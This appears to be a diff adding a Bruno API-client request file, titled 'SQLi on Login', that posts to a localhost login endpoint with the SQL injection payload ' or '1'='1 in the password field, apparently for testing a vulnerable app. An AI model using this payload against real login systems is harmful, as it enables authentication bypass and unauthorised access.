@@ -1,0 +1,15 @@
+meta {
+  name: SQLi on Login
+  type: http
+  seq: 2
+}
+
+post {
+  url: http://127.0.0.1:9000/api/v2/login
+  body: json
+  auth: none
+}
+
+body:json {
+  {"username": "chincol", "password": "' or '1'='1"}
+}
